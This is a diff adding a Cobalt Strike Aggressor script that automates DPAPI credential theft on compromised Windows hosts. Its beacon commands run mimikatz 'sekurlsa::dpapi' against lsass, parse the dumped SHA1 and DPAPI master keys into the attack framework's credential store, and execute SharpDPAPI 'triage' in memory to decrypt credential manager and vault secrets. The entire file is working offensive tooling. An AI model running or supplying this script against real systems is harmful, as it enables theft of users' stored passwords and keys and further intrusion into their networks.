@@ -1,0 +1,289 @@
+# author: @tifkin_
+
+global('$SharpDPAPI::AssemblyPath');
+
+$SharpDPAPI::AssemblyPath = "/path/to/SharpDPAPI.exe";
+
+if(!-exists $SharpDPAPI::AssemblyPath) {
+    show_error("SharpDPAPI path not found!");
+    exit();
+}
+
+# Extract DPAPI creds from mimikatz output
+on beacon_output {
+	local('$hostname $account $domain $ntlm $sha1 $dpapi $password $length $guid $source');
+
+	$hostname = binfo($1,"internal") . " (" . binfo($1,"computer") . ")";
+
+	# DPAPI/SHA1 Keys from sekurlsa::logonPasswords
+	while ($2 hasmatch 'Username : (.*).*[\n\r].*Domain   : (.*)[\n\r].*NTLM.*[\n\r].*SHA1     : (.*)[\n\r].*DPAPI    : (.*)[\n\r]') {
+		$account = matched()[0];
+		$domain = matched()[1];
+		$sha1 = matched()[2];
+		$dpapi = matched()[3];
+
+		if($sha1) {
+			credential_add($account, $sha1, $domain, "mimikatz: SHA1", $hostname);
+		}
+
+		if($dpapi) {
+			credential_add($account, $dpapi, $domain, "mimikatz: DPAPI", $hostname);
+		}
+	}
+
+	# DPAPI masterkeys and SHA1 Keys from sekurlsa::dpapi
+	if ($2 hasmatch '	 \* MasterKey :') {
+		SharpDPAPI::ParseMasterKeys($1, $2, $hostname);
+	}
+}
+
+
+sub SharpDPAPI::ParseMasterKeys {
+	local('$1 $2 $beaconId $output $hostname $State $line $UserName $Domain $guid $masterkey $sha1 $STATE_ScanningForHeader $STATE_ParsingHeader $STATE_ScanningForKeyHeader $STATE_ParsingKeys');
+	
+	$beaconId = $1;	
+	$output = $2;
+	$hostname = $3;
+
+	$guid = "";
+	$masterkey = "";
+	$sha1 = "";
+	$Domain = "";
+	$UserName = "";
+
+	# States = 1 ScanningForHeader, 2 ParsingHeader, 3 ScanningForKeyHeader, 4 ParsingKeys
+	$STATE_ScanningForHeader = 1;
+	$STATE_ParsingHeader = 2;
+	$STATE_ScanningForKeyHeader = 3;
+	$STATE_ParsingKeys = 4;
+
+	$State = $STATE_ScanningForHeader;
+
+	foreach $line (split("\n", ["$output" trim])) {
+		# 1 = ScanningForHeader
+		if($State == $STATE_ScanningForHeader) {  # Scanning
+			if($line ismatch 'Authentication Id :.*') {
+				$State = $STATE_ParsingHeader;
+				#println("StateChange: ScanningForHeader")
+				continue;
+			} else if($line eq "Sleep : 111 ms... End !") {
+                blog($beaconId, "Mimikatz complete. Executing SharpDPAPI");
+                sleep(2000);    # Ugh, wait for the server to sync the creds locally
+				SharpDPAPI::ExecuteSharpDPAPI($1, true);
+				return;
+			} else if($line eq "Sleep : 112 ms... End !") {
+                blog($beaconId, "Mimikatz complete. Executing SharpDPAPI...");
+				sleep(2000);    # Ugh, wait for the server to sync the creds locally
+                SharpDPAPI::ExecuteSharpDPAPI($1, false);
+				return;
+			} else {
+				# Unexpected content, so we'll keep scanning for a header
+				continue;
+			}
+		}
+
+		# 2 = ParsingHeader
+		if($State == $STATE_ParsingHeader) {
+			if($line ismatch 'User Name         : (.*)') {
+				$UserName = matched()[0];
+			} else if($line ismatch 'Domain            : (.*)') {
+				$Domain = matched()[0];
+			} else if($line ismatch 'SID               : .*') {
+				$State = $STATE_ScanningForKeyHeader;
+				#println("StateChange: ParsingKeys(cont.)")
+				continue;
+			} else if($line ismatch '(Session|Logon Server|Logon Time)\W+: .*') {
+				# Still in the header, but we don't care about these fields
+				#println("StateChange: ParsingHeader(cont.)")
+				continue;
+			} else {
+				#println("StateChange: ScanningForHeader(cont.)")
+				$State = $STATE_ScanningForHeader;
+				$guid = "";
+				$masterkey = "";
+				$sha1 = "";
+				$Domain = "";
+				$UserName = "";
+				continue;
+			}
+		}
+
+		# 3 = ScanningForKeyHeader
+		if($State == $STATE_ScanningForKeyHeader) {
+			if($line ismatch '	 \[\d+\]') {   # Start of key
+				$guid = "";
+				$masterkey = "";
+				$sha1 = "";
+				$State = $STATE_ParsingKeys;
+				continue;
+			} else {
+				$State = $STATE_ScanningForHeader;
+				$guid = "";
+				$masterkey = "";
+				$sha1 = "";
+				$Domain = "";
+				$UserName = "";
+				continue;
+			}
+		}
+
+		if($State == $STATE_ParsingKeys) {
+			if($line ismatch '	 \* GUID      :	(.*)') {   # Start of key
+				$guid = matched()[0];
+			} else if($line ismatch '	 \* Time      :	.*') {   # Start of key
+				continue;
+			} else if($line ismatch '	 \* MasterKey :	(.*)') {   # Start of key
+				$masterkey = matched()[0];
+			} else if($line ismatch '	 \* sha1\(key\) :	(.*)') {   # Start of key
+				$sha1 = matched()[0];
+
+				#if($masterkey) {
+				#	credential_add($UserName, "$guid:$masterkey", $Domain, "mimikatz: DPAPI Master Key", $hostname);
+				#}
+				if($sha1) {
+					credential_add($UserName, $guid . ":" . $sha1, $Domain, "mimikatz: DPAPI Master Key SHA1", $hostname);
+				}
+
+				$guid = "";
+				$masterkey = "";
+				$sha1 = "";
+
+				$State = $STATE_ScanningForKeyHeader;
+				continue;
+			} else {
+				# ERROR
+				$guid = "";
+				$masterkey = "";
+				$sha1 = "";
+				$Domain = "";
+				$UserName = "";
+
+				$State = $STATE_ScanningForHeader;
+				continue;
+			}
+		}
+
+	}
+}
+
+beacon_command_register(
+    "sharpDPAPI",
+    "Extracts credential manager and vault credentials using SharpDPAPI.",
+    
+	"Use: sharpDPAPI [-dump] [-allkeys]\n" .
+    "Arguments:\n" .
+    "    -dump        Use mimikatz to dump DPAPI keys from lsass using Mimikatz's sekurlsa::dpapi\n" .
+    "    -allkeys     Use all DPAPI keys found in the credential store (not just the DPAPI keys found on this host)\n\n" .
+	"Extracts credential manager and vault credentials using SharpDPAPI.  Extracts DPAPI master keys using Mimikatz."
+);
+
+
+alias sharpDPAPI {
+    local('$1 $2 $3 $bid $DumpKeys $UseAllKeys');
+
+    $bid = $1;
+    $Dumpkeys = $false;
+    $UseAllKeys = $false;
+
+    if(lc($2) eq "-dump" || lc($3) eq "-dump") {
+        $DumpKeys = true;
+    }
+
+    if(lc($2) eq "-allkeys" || lc($3) eq "-allkeys") {
+        $UseAllKeys = true;
+    }
+
+    if($DumpKeys) {
+        if(-isadmin $1) {
+            # Keep the sleep in there. Janky way to pass an argument later...
+
+            if($UseAllKeys) {
+                bmimikatz($1, "sekurlsa::dpapi\ndpapi::cache\nstandard::sleep 111");
+            } else {
+                bmimikatz($1, "sekurlsa::dpapi\ndpapi::cache\nstandard::sleep 112");
+            }
+        } else {
+            berror($1, "You need to be an administrator.");
+        }
+    } else {
+        SharpDPAPI::ExecuteSharpDPAPI($bid, $UseAllKeys);
+    }
+}
+
+# 1 = bid, $UseAllKeys
+sub SharpDPAPI::ExecuteSharpDPAPI {
+    local('$1 $bid @masterkeys $UseAllKeys $command');
+
+    $bid = $1;
+    $UseAllKeys = $2;
+
+    @masterkeys = SharpDPAPI::GetMasterkeysFromCredStore($bid, $UseAllKeys);
+    
+    if(size(@masterkeys) > 0) {
+        $command = "triage " . join(" ", @masterkeys);
+        bexecute_assembly($bid, $SharpDPAPI::AssemblyPath, $command);
+    } else {
+        if($UseAllKeys) {
+            berror($1, 
+                "No masterkeys found.\n" . 
+                "If admin, run \"SharpDPAPI -dump\" to dump the masterkeys on the current machine from lsass.exe");
+        } else {
+            berror($1, 
+                "No masterkeys found on the current host.\n" . 
+                "If admin, run \"SharpDPAPI -dump\" to dump the masterkeys on the current machine from lsass.exe\n" .
+                "or run \"SharpDPAPI -allkeys\" to use all DPAPI keys found in the credential store.");
+        }
+    }
+}
+
+
+
+beacon_command_register(
+    "sharpDPAPI_masterkeysToClipboard",
+    "Copies all DPAPI master keys in the credential store to the clipboard.",
+    
+	"Use: sharpDPAPI_masterkeysToClipboard\n\n" .
+	"Copies all DPAPI master keys in the credential store to the clipboard.",
+);
+
+# 1 = ReturnAllKeys
+alias sharpDPAPI_masterkeysToClipboard {
+    local('@masterkeys $out $bid');
+
+    $bid = $1;
+    
+    @masterkeys = SharpDPAPI::GetMasterkeysFromCredStore($bid, true);
+
+    $out = join(" ", @masterkeys);
+    blog($1, "DPAPI master keys currently in Cobalt Strike's credential store (use these with SharpDPAPI):\n\n" . $out);
+	add_to_clipboard($out);
+}
+
+
+# 1 = bid, 2 = ReturnAllKeys
+sub SharpDPAPI::GetMasterkeysFromCredStore {
+    local('$1 $2 $bid %cred @masterkeys');
+	
+    $bid = $1;
+    $ReturnAllKeys = $2;
+
+	foreach %cred (credentials()) {
+
+        # Only return masterkeys on the current host
+        if($ReturnAllKeys eq false) {
+            if(!%cred["host"]) {
+                continue;
+            }
+
+            if(![%cred["host"] contains: binfo($bid, "host")]) {
+                continue;
+            }
+		}
+
+		if(%cred["password"] ismatch '\{[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}\}:.*') {
+			push(@masterkeys, %cred["password"]);
+		}
+	}
+
+    return @masterkeys;
+}
